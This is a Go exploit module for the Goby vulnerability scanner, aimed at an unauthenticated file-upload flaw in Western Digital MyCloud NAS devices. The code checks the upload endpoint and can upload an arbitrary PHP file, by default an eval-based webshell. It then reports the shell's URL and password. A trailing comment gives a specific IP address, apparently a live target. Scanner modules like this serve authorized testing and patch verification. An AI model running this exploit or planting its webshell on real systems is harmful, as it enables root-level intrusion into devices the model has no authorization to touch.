package exploits

import (
	"bytes"
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"mime/multipart"
	"net/textproto"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Western Digital MyCloud multi_uploadify File Upload",
    "Description": "This module exploits a file upload vulnerability found in Western Digital's MyCloudNAS web administration HTTP service. The /web/jquery/uploader/multi_uploadify.phpPHP script provides multipart upload functionality that is accessible without authenticationand can be used to place a file anywhere on the device's file system. This allows anattacker the ability to upload a PHP shell onto the device and obtain arbitrary codeexecution as root.",
    "Product": "WD-MyCloud",
    "Homepage": "https://support-en.wd.com/",
    "DisclosureDate": "2021-06-17",
    "Author": "sharecast.net@gmail.com",
    "GobyQuery": "app=\"WD-MyCloud\"",
    "Level": "3",
    "Impact": "<p>As a result, hackers can upload malicious files to the server to obtain the server permissions.</p>",
    "Recommendation": "<p>1. The execution permission is disabled in the storage directory of the uploaded file.</p><p>2. File suffix white list.</p><p>3. Upgrade to the latest version.</p>",
    "References": [
        "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/wd_mycloud_multiupload_upload.rb"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "<?php @eval($_REQUEST[1]); if($_GET['act']=='del'){unlink(__FILE__);}?>"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "File Upload"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10666"
}`

	postinfo := func(shell, fieldname string, filename string, params map[string]string) (*bytes.Buffer, string) {
		bodyBuf := &bytes.Buffer{}
		bw := multipart.NewWriter(bodyBuf)
		h := make(textproto.MIMEHeader)
		h.Set("Content-Disposition", fmt.Sprintf(`form-data; name="%s"; filename="%s"`, fieldname, filename))
		h.Set("Content-Type", "image/jpeg")
		bodyWriter, _ := bw.CreatePart(h)
		bodyWriter.Write([]byte(shell))
		if params != nil {
			for key, val := range params {
				_ = bw.WriteField(key, val)
			}
		}

		contentType := bw.FormDataContentType()
		bw.Close()

		return bodyBuf, contentType
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomStr := goutils.RandomHexString(8)
			uri := "/web/jquery/uploader/multi_uploadify.php?folder=/var/www/"
			shell := fmt.Sprintf("<?php echo md5('%s');unlink(__FILE__);?>", randomStr)
			fieldname := "Filedata[]"
			filename := fmt.Sprintf("%s.php", goutils.RandomHexString(32))
			pinfo, ctype := postinfo(shell, fieldname, filename, nil)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", ctype)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = pinfo.String()
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + uri); err == nil {
				if resp.StatusCode == 302 && strings.Contains(resp.Header.Get("Location"), "status=1") {
					if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
						if resp.StatusCode == 302 && strings.Contains(resp.Header.Get("Location"), "status=1") {
							shell_url := fmt.Sprintf("%s/%s", u.FixedHostInfo, filename)
							if resp, err := httpclient.SimpleGet(shell_url); err == nil {
								return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, fmt.Sprintf("%x", md5.Sum([]byte(randomStr))))
							}
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/web/jquery/uploader/multi_uploadify.php?folder=/var/www/"
			shell := ss.Params["cmd"].(string)
			fieldname := "Filedata[]"
			filename := fmt.Sprintf("%s.php", goutils.RandomHexString(32))
			pinfo, ctype := postinfo(shell, fieldname, filename, nil)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", ctype)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = pinfo.String()
			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + uri); err == nil {
				if resp.StatusCode == 302 && strings.Contains(resp.Header.Get("Location"), "status=1") {
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
						if resp.StatusCode == 302 && strings.Contains(resp.Header.Get("Location"), "status=1") {
							shell_url := fmt.Sprintf("%s/%s", expResult.HostInfo.FixedHostInfo, filename)
							if resp, err := httpclient.SimpleGet(shell_url); err == nil {
								if resp.StatusCode == 200 {
									expResult.Success = true
									shellinfo := fmt.Sprintf("webshell url: %s, pass:1", shell_url)
									expResult.Output = shellinfo
								}
							}
						}
					}
				}
			}
			return expResult
		},
	))
}

//https://37.35.125.233/
